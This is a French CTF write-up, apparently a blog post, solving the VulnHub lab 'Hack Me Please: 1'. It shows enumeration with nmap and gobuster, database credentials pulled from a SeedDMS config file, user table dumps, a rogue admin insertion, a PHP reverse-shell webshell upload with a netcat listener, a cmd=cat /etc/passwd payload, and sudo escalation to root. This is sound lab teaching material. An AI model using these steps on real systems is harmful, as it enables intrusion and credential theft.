{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Hack Me Please: 1","date":"20 September 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.2</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.23</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir HackMePlease1 &amp;&amp; cd HackMePlease1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">80</span>/tcp    <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.41 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token number\">3306</span>/tcp  <span class=\"token function\">open</span>  mysql   MySQL <span class=\"token number\">8.0</span>.25-0ubuntu0.20.04.1\n<span class=\"token number\">33060</span>/tcp <span class=\"token function\">open</span>  mysqlx?</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>Apache</strong> 2.4.41 sur le port <strong>80</strong> et un serveur <strong>MySQL</strong> 8.0.25 sur le port <strong>3306</strong>.</p>\n<p>En inspectant dans les fichiers JavaScript, on trouve un indice dans le fichier \"main.js\".</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Ce endpoint est un formulaire de connexion. Sur Internet, on découvre que <strong>SeedDMS</strong> est une sorte de <strong>CMS</strong>. En poursuivant avec <strong>Gobuster</strong>, on découvre des choses intéressantes.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span>/seeddms51x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster.txt\n/data                 <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">322</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.23/seeddms51x/data/<span class=\"token punctuation\">]</span>\n/www                  <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">321</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.23/seeddms51x/www/<span class=\"token punctuation\">]</span> \n/conf                 <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">322</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.23/seeddms51x/conf/<span class=\"token punctuation\">]</span>\n/pear                 <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">322</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.23/seeddms51x/pear/<span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On obtient un résultat en approfondisant sur le dossier \"/conf\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span>/seeddms51x/conf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster_conf.txt\n/settings.xml         <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">12377</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Dans ce fichier xml, on trouve une ligne intéressante.</p>\n<div class=\"gridsome-highlight\" data-language=\"xml\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-xml line-numbers\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>database</span> <span class=\"token attr-name\">dbDriver</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>mysql<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">dbHostname</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>localhost<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">dbDatabase</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>seeddms<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">dbUser</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>seeddms<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">dbPass</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>seeddms<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">doNotCheckVersion</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>false<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>database</span><span class=\"token punctuation\">></span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>En effet, on a ce qu'il faut pour se connecter au serveur <strong>MySQL</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ mysql -h <span class=\"token variable\">$IP</span> -u seeddms -p\nEnter password: seeddms\nWelcome to the MySQL monitor.  Commands end with <span class=\"token punctuation\">;</span> or <span class=\"token punctuation\">\\</span>g.\nYour MySQL connection <span class=\"token function\">id</span> is <span class=\"token number\">83</span>\nServer version: <span class=\"token number\">8.0</span>.25-0ubuntu0.20.04.1 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Une fois connecté, on consulte les bases de données disponibles.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">mysql<span class=\"token operator\">></span> show databases<span class=\"token punctuation\">;</span>\n+--------------------+\n<span class=\"token operator\">|</span> Database           <span class=\"token operator\">|</span>\n+--------------------+\n<span class=\"token operator\">|</span> information_schema <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> mysql              <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> performance_schema <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> seeddms            <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> sys                <span class=\"token operator\">|</span>\n+--------------------+</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On en retrouve une nommée \"seeddms\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">mysql<span class=\"token operator\">></span> use seeddms<span class=\"token punctuation\">;</span>\nmysql<span class=\"token operator\">></span> show tables<span class=\"token punctuation\">;</span>\n+------------------------------+\n<span class=\"token operator\">|</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> tblUsers                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token function\">users</span>                        <span class=\"token operator\">|</span>\n+------------------------------+\n<span class=\"token number\">43</span> rows <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0,01</span> sec<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On énumère les tables dont deux sembles concernées des utilisateurs.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> * from tblUsers <span class=\"token punctuation\">\\</span>G<span class=\"token punctuation\">;</span>\n*************************** <span class=\"token number\">1</span>. row ***************************\n           id: <span class=\"token number\">1</span>\n        login: admin\n          pwd: f9ef2c539bad8a6d2f3432b6d49ab51a\n     fullName: Administrator\n        email: address@server.com\n     language: en_GB\n        theme:\n      comment:\n         role: <span class=\"token number\">1</span>\n       hidden: <span class=\"token number\">0</span>\npwdExpiration: <span class=\"token number\">2021</span>-07-13 00:12:25\nloginfailures: <span class=\"token number\">0</span>\n     disabled: <span class=\"token number\">0</span>\n        quota: <span class=\"token number\">0</span>\n   homefolder: NULL</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un exemple d'utilisateur bien qu'il ne soit pas utilisable (mot de passe encodé en md5).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> * from <span class=\"token function\">users</span><span class=\"token punctuation\">;</span>\n+-------------+---------------------+--------------------+-----------------+\n<span class=\"token operator\">|</span> Employee_id <span class=\"token operator\">|</span> Employee_first_name <span class=\"token operator\">|</span> Employee_last_name <span class=\"token operator\">|</span> Employee_passwd <span class=\"token operator\">|</span>\n+-------------+---------------------+--------------------+-----------------+\n<span class=\"token operator\">|</span>           <span class=\"token number\">1</span> <span class=\"token operator\">|</span> saket               <span class=\"token operator\">|</span> saurav             <span class=\"token operator\">|</span> Saket@<span class=\"token comment\">#$1337    |</span>\n+-------------+---------------------+--------------------+-----------------+</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dans cette seconde table, on récupère des crédentials intéressants \"saket:Saket@#$1337\", sans doute pour plus tard. En attendant, on génére un nouvel utilisateur pour se connecter au <em>CMS</em>.</p>\n<div class=\"gridsome-highlight\" data-language=\"sql\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-sql line-numbers\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> tblUsers <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'hackme'</span><span class=\"token punctuation\">,</span> md5<span class=\"token punctuation\">(</span><span class=\"token string\">'pass'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'hackme'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'hackme@vulnhub.com'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'fr_FR'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'2042-07-13 00:12:25'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>On peut désormais se connecter avec \"hackme:pass\".</p>\n<p>Sur <strong>Searchsploit</strong>, on trouve un exploit possible.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ searchsploit -x php/webapps/47022.txt\nexample.com/data/1048576/<span class=\"token string\">\"document_id\"</span>/1.php?cmd<span class=\"token operator\">=</span>cat+/etc/passwd</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Pour ce faire, on a besoin d'un webshell que l'on prépare.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class=\"token builtin class-name\">.</span>\n$ <span class=\"token function\">vim</span> php-reverse-shell.php\n/ip</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Et dans un nouvel onglet, on lance le serveur <strong>Ncat</strong> <code class=\"language-text\">nc -lnvp 1234</code>.</p>\n<p>Pour uploader le webshell, allez dans \"Ajouter un document\", puis dans le champs \"Fichier local\", cliquez sur \"Parcourir\" et validez en cliquant sur le bouton en bas \"Ajouter un document\". D'après l'énoncé de l'exploit, l'URL pour exécuter le webshell est <a href=\"http://192.168.1.23/seeddms51x/data/1048576/4/1.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.1.23/seeddms51x/data/1048576/4/1.php</a> (remplacez par l'IP de votre VM).</p>\n<h2>Pénétration</h2>\n<p>De retour dans le terminal, la connexion est établie et on peut se connecter avec l'utilisateur \"saket\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">su</span> saket\nPassword: Saket@<span class=\"token comment\">#$1337</span>\npython2 -c <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>saket<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>saket<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>saket<span class=\"token punctuation\">)</span>,4<span class=\"token punctuation\">(</span>adm<span class=\"token punctuation\">)</span>,24<span class=\"token punctuation\">(</span>cdrom<span class=\"token punctuation\">)</span>,27<span class=\"token punctuation\">(</span>sudo<span class=\"token punctuation\">)</span>,30<span class=\"token punctuation\">(</span>dip<span class=\"token punctuation\">)</span>,46<span class=\"token punctuation\">(</span>plugdev<span class=\"token punctuation\">)</span>,120<span class=\"token punctuation\">(</span>lpadmin<span class=\"token punctuation\">)</span>,131<span class=\"token punctuation\">(</span>lxd<span class=\"token punctuation\">)</span>,132<span class=\"token punctuation\">(</span>sambashare<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>On consulte les privilèges de cet utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\n<span class=\"token punctuation\">[</span>sudo<span class=\"token punctuation\">]</span> password <span class=\"token keyword\">for</span> saket: Saket@<span class=\"token comment\">#$1337</span>\nUser saket may run the following commands on ubuntu:\n    <span class=\"token punctuation\">(</span>ALL <span class=\"token builtin class-name\">:</span> ALL<span class=\"token punctuation\">)</span> ALL</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>L'utilisateur peut tout faire.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">su</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Et voila c'est fini, pas de clef à trouver dans ce CTF d'après l'auteur \"Aim: To get root shell\".</p>\n","download":"https://www.vulnhub.com/entry/hack-me-please-1,731","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":4,"parts":[]}},"context":{}}